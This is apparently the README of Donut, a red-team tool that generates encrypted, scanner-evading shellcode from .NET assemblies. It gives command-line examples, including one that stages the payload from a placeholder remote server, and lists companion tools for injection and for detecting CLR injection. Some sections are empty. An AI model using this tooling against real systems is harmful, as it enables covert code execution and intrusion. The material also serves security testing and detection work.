# Using Donut

Donut is a shellcode generation tool that creates x86 or x64 shellcode payloads from arbitrary .NET Assemblies. Given an arbitrary .NET Assembly, parameters, and an entry point (such as Program.Main), it produces position-independent shellcode that loads it from memory. The .NET Assembly can either be staged from a URL or stageless by being embedded directly in the shellcode. Either way, the .NET Assembly is encrypted with the SPECK symmetric encryption algorithm and a randomly generated key. After the Assembly is loaded through the CLR, the original reference is randomized and freed from memory to deter memory scanners. The Assembly can either be loaded into the default Application Domain or a new one (to allow for running Assemblies in disposable AppDomains).

It can be used in several ways.

## As a Standalone Tool

Donut can be used as-is to generate shellcode from arbitrary .NET Assemblies. Both a Windows EXE and a Python script are provided for payload generation. The command-line syntax is as described below.

```

 usage: donut [options] -f <.NET assembly> | -u <URL hosting donut module>

       -f <path>            .NET assembly to embed in PIC and DLL.
       -u <URL>             HTTP server hosting the .NET assembly.
       -c <namespace.class> The assembly class name.
       -m <method>          The assembly method name.
       -p <arg1,arg2...>    Optional parameters for method, separated by comma or semi-colon.
       -a <arch>            Target architecture : 1=x86, 2=amd64(default).
 examples:

    donut -a 1 -c TestClass -m RunProcess -p notepad.exe -f loader.dll
    donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe -u http://remote_server.com/modules/

```

## As a Library

donut is provided in *.dll* and *.lib* format to be used as a library. It has a simple API that is described in *api.html*. Several exported fucntions are provided, including ``` int CreatePayload(PDONUT_CONFIG c) ```. They all use the PDONUT_CONFIG struct as input.

## As a Template

Part of why donut was published was to provide a template for custom shellcode generators. Since all of the logic for the shellcode is defined in *payload.c*, that logic can be customized by simply changing the *payload* source code. Once the source code is changed, use the provided makefile to rebuild *payload.exe* using any of the following options

```
make x86
make x64
make debug
make clean
```



## How it works


## Procedure



## Components

Donut contains the following elements:

* donut.c: The source code for the donut payload generator
* donut.exe: The compiled payload generator as an EXE
* donut.py: The donut payload generator as a Python script
* donut.dll, donut.lib: Donut as a library for use in other projects
* payload.c: The source code for the shellcode
* payload.exe: The compiled payload. The shellcode is extracted from this binary file.
* xbin.cpp: Source code for xbin
* xbin.exe: Extracts the useful machine code from payload.exe so that it may be used as shellcode

Additionally, there are three companion projects provided with donut:

* DonutTest: A simple C# shellcode injector to use in testing donut. The shellcode must be base64 encoded and copied in as a string. 
* ProcessManager: A Process Discovery tool that offensive operators may use to determine what to inject into and defensive operators may use to determine what is running, what properties those processes have, and whether or not they have the CLR loaded. 
* ModuleMonitor: A proof-of-concept tool that detect CLR injection as it is done by tools such as donut and Cobalt Strike's execute-assembly.
